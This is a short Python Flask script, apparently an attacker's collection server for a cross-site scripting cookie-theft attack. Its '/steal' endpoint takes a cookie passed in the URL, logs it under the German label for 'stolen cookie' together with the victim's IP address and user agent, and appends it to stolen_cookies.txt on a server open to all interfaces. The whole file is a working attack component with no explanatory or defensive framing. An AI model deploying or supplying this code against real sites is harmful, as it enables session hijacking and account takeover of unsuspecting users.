from flask import Flask, request
from datetime import datetime

app = Flask(__name__)


@app.route('/steal')
def steal():
    cookie = request.args.get('c', 'Kein Cookie')
    timestamp = datetime.now().strftime('%Y-%m-%d %H:%M:%S')

    print(f"\n[{timestamp}] GESTOHLENES COOKIE:")
    print(f"Cookie: {cookie}")
    print(f"IP: {request.remote_addr}")
    print(f"User-Agent: {request.headers.get('User-Agent')}")
    print("-" * 80)

    with open('stolen_cookies.txt', 'a') as f:
        f.write(f"[{timestamp}] {cookie}\n")

    return '', 204


if __name__ == '__main__':
    app.run(host='0.0.0.0', port=8080)
